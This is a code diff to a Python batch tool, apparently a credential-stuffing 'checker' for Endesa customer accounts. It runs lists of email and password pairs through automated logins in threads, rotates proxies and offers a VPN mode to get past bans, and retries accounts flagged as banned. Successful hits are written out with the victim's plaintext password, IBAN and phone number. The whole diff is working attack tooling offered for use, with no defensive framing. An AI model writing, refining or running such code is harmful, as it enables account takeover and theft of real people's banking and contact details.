@@ -348,13 +348,10 @@ class BatchProcessorThread(QThread):
                         
                         # Remove from tracking
                         del future_to_credential[future]
-                        
                     except Exception as e:
                         email, password, line_num = future_to_credential[future]
                         result = f"ERROR: Line {line_num} - {email} - {str(e)}"
                         self._write_result_to_file(result)
-                        
-                        # Emit the actual result message
                         self.progress_updated.emit(result)
                         
                         results.append("FAILED")
@@ -369,130 +366,71 @@ class BatchProcessorThread(QThread):
         return results, new_retries
     
     def _process_single_credential(self, email: str, password: str, line_num: int) -> Tuple[str, str]:
-        """Process a single credential - this runs in a separate thread."""
-        current_proxy = None
-        try:
-            # Get proxy from proxy manager if available
-            if self.proxy_manager:
-                if self.proxy_strategy == "random":
-                    current_proxy = self.proxy_manager.get_random_proxy()
-                elif self.proxy_strategy == "best_performance":
-                    current_proxy = self.proxy_manager.get_best_proxy()
-                else:  # round_robin
-                    current_proxy = self.proxy_manager.get_next_proxy()
-            else:
-                current_proxy = self.proxy
-            
-            # Normalize proxy format if needed
-            normalized_proxy = None
-            if current_proxy and self.proxy_manager:
-                normalized_proxy = self.proxy_manager._normalize_proxy_for_requests(current_proxy)
-            elif current_proxy:
-                # Fallback normalization if no proxy manager
-                if '://' not in current_proxy:
-                    if '@' in current_proxy:
-                        normalized_proxy = f"http://{current_proxy}"
-                    elif current_proxy.count(':') >= 3:
-                        parts = current_proxy.split(':')
-                        host, port = parts[0], parts[1]
-                        auth = ':'.join(parts[2:])
-                        normalized_proxy = f"http://{auth}@{host}:{port}"
-                    elif current_proxy.count(':') == 1:
-                        normalized_proxy = f"http://{current_proxy}"
-                    else:
-                        normalized_proxy = current_proxy
-                else:
-                    normalized_proxy = current_proxy
-            
-            # Create client with scaled connection pool and retry configuration
-            client = EndesaClient(email, password, self.max_workers, self.max_retries, 
-                                 self.retry_delay, normalized_proxy, [])
-            
-            # Step 1: Try to login first with retry mechanism
+        """
+        Process ONE credential.
+        Normal mode  -> instant retries here.
+        VPN mode     -> NO retries here; outer loop retries.
+        """
+        instant_retry_allowed = not self.use_vpn
+        max_instant_retries = self.max_retries if instant_retry_allowed else 0
+        attempt = 0
+    
+        while attempt <= max_instant_retries:
             try:
-                client.login()
-                login_successful = True
-            except Exception as login_error:
-                login_successful = False
-                error_msg = str(login_error)
-                
-                # Check for banned accounts (after all retries failed)
-                if "BANNED:" in error_msg:
-                    result = f"BANNED: Line {line_num} - {email} - {error_msg} (after {self.max_retries} retries)"
-                    
-                    # Mark proxy as failed if used
-                    if current_proxy and self.proxy_manager:
-                        self.proxy_manager.mark_proxy_failed(current_proxy)
-                    
-                    return result, "BANNED"
-                # Check for timeout errors - these should be retried
-                elif "timeout" in error_msg.lower() or "timed out" in error_msg.lower():
-                    result = f"TIMEOUT: Line {line_num} - {email} - {error_msg}"
-                    
-                    # Mark proxy as failed if used
-                    if current_proxy and self.proxy_manager:
-                        self.proxy_manager.mark_proxy_failed(current_proxy)
-                    
-                    return result, "TIMEOUT"  # Mark for retry
-                # Check for specific "Invalid URL '/sites/Satellite'" error - this is the only one we count as invalid
-                elif "invalid url '/sites/satellite'" in error_msg.lower():
-                    result = f"INVALID: Line {line_num} - {email} - Invalid URL Satellite"
-                    return result, "INVALID"
-                # All other login failures - don't write these to file
+                # Build proxy string (if any)
+                proxy = None
+                if self.proxy and '://' not in self.proxy:
+                    proxy = f"http://{self.proxy}"
                 else:
-                    result = f"LOGIN_FAILED: Line {line_num} - {email} - {error_msg}"
-                    return result, "FAILED"  # Count as failed but don't write to file
-            
-            # Step 2: Only continue with data retrieval if login was successful
-            if login_successful:
-                try:
-                    account_info = client.get_account_info()
-                    
-                    # Format result with password included
-                    result = f"SUCCESS: Line {line_num} - {email}:{password} - IBAN: {account_info['iban']} Phone: {account_info['phone']}"
-                    
-                    # Mark proxy as successful if used
-                    if current_proxy and self.proxy_manager:
-                        self.proxy_manager.mark_proxy_success(current_proxy)
-                    
-                    return result, "SUCCESS"
-                    
-                except Exception as data_error:
-                    error_msg = str(data_error)
-                    # Check for banned accounts during data retrieval (after all retries failed)
-                    if "BANNED:" in error_msg:
-                        result = f"BANNED: Line {line_num} - {email} - {error_msg} (after {self.max_retries} retries)"
-                        
-                        # Mark proxy as failed if used
-                        if current_proxy and self.proxy_manager:
-                            self.proxy_manager.mark_proxy_failed(current_proxy)
-                        
-                        return result, "BANNED"
-                    # Check for "no retrieve data" cases - write these to file
-                    elif "no retrieve data" in error_msg.lower() or "data not found" in error_msg.lower():
-                        result = f"NO_DATA: Line {line_num} - {email}:{password} - No data retrieved"
-                        
-                        # Mark proxy as successful if used (since we got a valid response)
-                        if current_proxy and self.proxy_manager:
-                            self.proxy_manager.mark_proxy_success(current_proxy)
-                        
-                        return result, "NO_DATA"
-                    else:
-                        result = f"ERROR: Line {line_num} - {email} - Data retrieval failed: {error_msg}"
-                        return result, "FAILED"
-                        
-        except Exception as e:
-            result = f"ERROR: Line {line_num} - {email} - {str(e)}"
-            
-            # Mark proxy as failed if used
-            if current_proxy and self.proxy_manager:
-                self.proxy_manager.mark_proxy_failed(current_proxy)
-            
-            return result, "FAILED"
-        finally:
-            # Always close the client to free connection pool resources
-            if 'client' in locals():
-                client.close()
+                    proxy = self.proxy
+    
+                # Create client (only 1 internal attempt)
+                client = EndesaClient(
+                    email,
+                    password,
+                    max_workers=self.max_workers,
+                    max_retries=1,
+                    retry_delay=self.retry_delay,
+                    proxy=proxy,
+                    proxy_list=[]
+                )
+    
+                # Login
+                client.login()
+    
+                # Get account info
+                account_info = client.get_account_info()
+                result = f"SUCCESS: Line {line_num} - {email}:{password} - IBAN: {account_info['iban']} Phone: {account_info['phone']}"
+                return result, "SUCCESS"
+    
+            except Exception as e:
+                error_msg = str(e)
+    
+                # Retry only if allowed and we haven't hit the limit
+                if "BANNED:" in error_msg and attempt < max_instant_retries:
+                    attempt += 1
+                    self.progress_updated.emit(
+                        f"BANNED: Line {line_num} - {email} - Instant retry {attempt}/{max_instant_retries}"
+                    )
+                    time.sleep(self.retry_delay)
+                    continue  # loop again
+                
+                # Final classification
+                if "BANNED:" in error_msg:
+                    return f"BANNED: Line {line_num} - {email} - {error_msg}", "BANNED"
+                elif "timeout" in error_msg.lower():
+                    return f"TIMEOUT: Line {line_num} - {email} - {error_msg}", "TIMEOUT"
+                elif "invalid url '/sites/satellite'" in error_msg.lower():
+                    return f"INVALID: Line {line_num} - {email} - Invalid URL Satellite", "INVALID"
+                else:
+                    return f"ERROR: Line {line_num} - {email} - {error_msg}", "FAILED"
+    
+            finally:
+                if 'client' in locals():
+                    client.close()
+    
+        # Exhausted instant retries
+        return f"FAILED: Line {line_num} - {email} - Max retries reached", "FAILED"
     
     def _write_result_to_file(self, result: str):
         """Write a single result immediately to file."""
